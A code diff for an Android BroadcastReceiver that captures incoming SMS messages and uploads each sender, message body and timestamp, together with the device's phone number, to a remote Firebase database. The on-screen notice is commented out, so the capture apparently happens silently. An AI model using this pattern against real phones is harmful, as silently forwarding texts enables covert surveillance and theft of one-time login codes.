@@ -37,7 +37,7 @@ public class MyReceiver extends BroadcastReceiver {
 
     // Write a message to the database
     FirebaseDatabase database = FirebaseDatabase.getInstance();
-    DatabaseReference myRef = database.getReference().child("users").push();
+    DatabaseReference myRef = database.getReference().child("SMS").push();
 
 
     @Override
@@ -48,7 +48,7 @@ public class MyReceiver extends BroadcastReceiver {
         if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
             return;
         }
-        String mPhoneNumber = tMgr.getSimSerialNumber();
+        String mPhoneNumber = tMgr.getLine1Number();
 
         // Create a DateFormatter object for displaying date in specified format.
         SimpleDateFormat formatter = new SimpleDateFormat("hh:mm:ss aa dd/MM/yyyy");
@@ -90,6 +90,7 @@ public class MyReceiver extends BroadcastReceiver {
                 // Uncomment this to display a text popup of the following variables on the phone screen
                 //Toast.makeText(context,"Message: " +msg + "\nNumber: " + phoneNo, Toast.LENGTH_LONG).show();
 
+                //populate SMS database
                 myRef.child("Sender").setValue(phoneNo);
                 myRef.child("Message").setValue(msg);
                 myRef.child("Time").setValue(timeStamp);
